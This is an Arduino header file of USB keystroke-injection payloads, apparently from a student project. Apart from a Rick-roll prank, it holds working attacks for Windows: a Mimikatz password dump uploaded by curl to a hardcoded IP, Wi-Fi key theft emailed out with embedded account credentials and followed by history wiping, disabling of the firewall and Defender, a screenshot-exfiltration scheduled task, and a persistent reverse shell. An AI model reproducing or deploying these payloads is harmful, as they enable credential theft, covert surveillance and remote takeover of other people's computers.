#include "Keyboard.h"

/* Payloads.h contains our different payload functions that will carry out when user desires */


// typeKey function for usage in other payload functions
void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function for RICK ROLLER */
void openLinkURL()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(600);

  // Linux run dialog
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  Keyboard.releaseAll();

  delay(200);

  // Mac OS run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(200);

  // On Windows this changes the input language, so press 3 times
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  // On another OS, this could have typed "   r". Backspace 4 times.
  for(int i = 0; i < 4; i++) {
    typeKey(KEY_DELETE);
  }

  // Type in URL and open page!
  Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}



/* Init function for MIMIKATZ */
void mimikatzP() {
  // Begining the Keyboard stream
  Keyboard.begin();


  // Wait 500ms
  delay(500);
  Keyboard.releaseAll();


  // --------------set default delay based on targets computer speed, 350 is around mid range
  // -------------first delay is 1 second (you may need more) to let windows set up the "keyboard"
  // ------------open powershell as admin and set an exclusion path in the C:\Users path
  /*Keyboard.press(KEY_LEFT_GUI);
  delay(600);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);
  Keyboard.print("powershell");
  delay(600);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');*/  
  
  /*
  Keyboard.releaseAll();
  delay(600);
  Keyboard.print("Set-MpPreference -ExclusionPath C:\\Users");
  delay(600);
  typeKey(KEY_RETURN);
  delay(600);
  Keyboard.print("exit");
  delay(600);
  typeKey(KEY_RETURN);
  delay(600);*/
  // -------------download mimikatz
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RIGHT_ARROW);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(600);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.press(KEY_RETURN);
  delay(600);
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip','%temp%\\pw.zip')");
  delay(600);
  typeKey(KEY_RETURN);
  Keyboard.print("powershell -Command \"Expand-Archive -Path '%temp%\\pw.zip' -DestinationPath '%temp%\\pw'\"");
  typeKey(KEY_RETURN);

  // ------------run the following mimikatz commands and print results in new txt file
  delay(4000);

  Keyboard.print("%TEMP%\\pw\\x64\\mimikatz > C:\\pwlog.txt & type pwlog.txt");
  delay(600);
  typeKey(KEY_RETURN);
  delay(600);
  Keyboard.print("privilege::debug");
  delay(600);
  typeKey(KEY_RETURN);
  delay(600);
  Keyboard.print("sekurlsa::logonPasswords full");
  delay(600);
  typeKey(KEY_RETURN);
  delay(600);
  Keyboard.print("exit");
  delay(600);
  typeKey(KEY_RETURN);

  // < --------- delete mimikatz
  Keyboard.print("del %TEMP%\\pw.zip");
  delay(600);
  typeKey(KEY_RETURN);
  Keyboard.print("rmdir /s /q %TEMP%\\pw");
  delay(600);
  typeKey(KEY_RETURN);
  Keyboard.print("curl -T C:\\pwlog.txt 116.14.240.55/handlermimi.php");//CHange the IP dependoinf on server IP
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  //Keyboard.print("exit");

  typeKey(KEY_RETURN);



  //Keyboard.press(KEY_LEFT_CTRL);
  //delay(200);
  //Keyboard.press(KEY_LEFT_SHIFT);
  //delay(200);
  //Keyboard.press(KEY_RETURN);
  //Keyboard.releaseAll();
  //delay(200);
  //Keyboard.press(KEY_LEFT_ALT);
  //delay(200);
  //Keyboard.press('y');
  //delay(200);
  //Keyboard.releaseAll();
  //delay(200);
  //Keyboard.press(KEY_LEFT_ALT);
  //Keyboard.press('y');
  //Keyboard.print("powershell start-process cmd -verb runas");
  //Keyboard.releaseAll();
  //Keyboard.press(KEY_RETURN);
  //Keyboard.press(KEY_LEFT_ALT);
  //Keyboard.press('y');
  delay(600);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}


/* Function to off Tamper Protection */
void offTamperProtection()
{
    // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Disable windows defender
  typeKey(KEY_LEFT_GUI);

  delay(500);
  Keyboard.print(F("TAMPER PROTECTION"));
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.write(' ');
  Keyboard.releaseAll();
  delay(500);

  // Ending stream
  typeKey(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.write(' ');
  Keyboard.releaseAll();
  delay(500);

    // Ending stream
  typeKey(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(500);

  typeKey(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  Keyboard.end();
}


/* Disable Firewall Function */
void offFirewall() {
  // Begining the Keyboard stream
  Keyboard.begin();


  // Wait 500ms
  delay(500);
  Keyboard.releaseAll();

  // Open CMD as admin and off firewall
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RIGHT_ARROW);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(600);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.press(KEY_RETURN);
  delay(600);
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("netsh advfirewall set allprofiles state off");
  delay(600);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}


/* WifiStealer */
void wifiStlr()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(150);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("color FE & mode con:cols=18 lines=1");

  typeKey(KEY_RETURN);

  // --> Harvest
  Keyboard.print("cd Desktop");

  typeKey(KEY_RETURN);

  Keyboard.print("mkdir A");

  typeKey(KEY_RETURN);

  Keyboard.print("cd A");

  typeKey(KEY_RETURN);

  Keyboard.print("netsh wlan export profile key=clear");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd ..");

  delay(500);

  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("Compress-Archive -Path A -DestinationPath A.zip");

  typeKey(KEY_RETURN);
  delay(500);

  // --> Outlook SMTP
  delay(500);

  Keyboard.print("$SMTPServer = 'smtp.office365.com'");

  typeKey(KEY_RETURN);
  

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ict1011fde@outlook.com', 'Apple12345')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'ict1011fde@outlook.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('ict1011fde@outlook.com')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = \"Harvest-Report\"");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = \"GG, you got it\"");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Attachments.Add(\"A.zip\")");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  delay(400);

  // --> Clean up
  Keyboard.print("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");

  typeKey(KEY_RETURN);

  Keyboard.print("cd ..");

  typeKey(KEY_RETURN);

  Keyboard.print("cd AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine");

  typeKey(KEY_RETURN);

  Keyboard.print("del ConsoleHost_history.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("del A & rmdir A");

  typeKey(KEY_RETURN);

  Keyboard.print("S");

  typeKey(KEY_RETURN);

  Keyboard.print("del A.zip & exit");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}


/* Screengrabber */
void scrnGrbbr() {
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("powershell");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RIGHT_ARROW);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("$source='https://www.nirsoft.net/utils/nircmd.zip'");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("$destination=\"$HOME\\nircmd.zip\"");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("Invoke-WebRequest -Uri $source -OutFile $destination");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("Expand-Archive -Path \"$HOME\\nircmd.zip\" -DestinationPath \"$HOME\\\"");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("schtasks.exe /CREATE /SC MINUTE /MO 2 /TN 'ScreenshotCapture' /TR \"$HOME\\nircmd.exe savescreenshot $HOME\\screen.png\"");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("schtasks.exe /CREATE /SC MINUTE /MO 1 /TN 'UploadCapture' /TR \"curl.exe -T $HOME\\screen.png 116.14.240.55/handlerTJ.php\" -RU \"SYSTEM\"");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("$TaskSettings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("Set-ScheduledTask -TaskName ScreenshotCapture -Settings $TaskSettings");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("Set-ScheduledTask -TaskName UploadCapture -Settings $TaskSettings");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.print("exit");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}


/* Reverse Shell */
void revShell()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RIGHT_ARROW);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
   delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell -Command \"Add-MpPreference -ExclusionPath \"C:\\win\"\""); //Persistence, by creating exception, Anti virus won't mess with it.
  // Important that exception is created before wget command
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(600);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.press(KEY_RETURN);
  delay(600);
  Keyboard.releaseAll();

  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://github.com/zhenyk451/hm/blob/main/a.exe?raw=true' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
  typeKey(KEY_RETURN);
  delay(3000);

  // Persistence
  Keyboard.print("\SCHTASKS /CREATE /SC MINUTE /MO 1 /TN \"FakeTask\\ReverseShell\" /TR \"'C:\\win\\a.exe' 116.14.240.55 450 -e cmd.exe\" -RU \"SYSTEM\"");  //admin but need "Run as Administrator"
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("powershell");
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RIGHT_ARROW);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("$TaskSettings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries");
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.print("Set-ScheduledTask -TaskName \\FakeTask\\ReverseShell -Settings $TaskSettings");
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}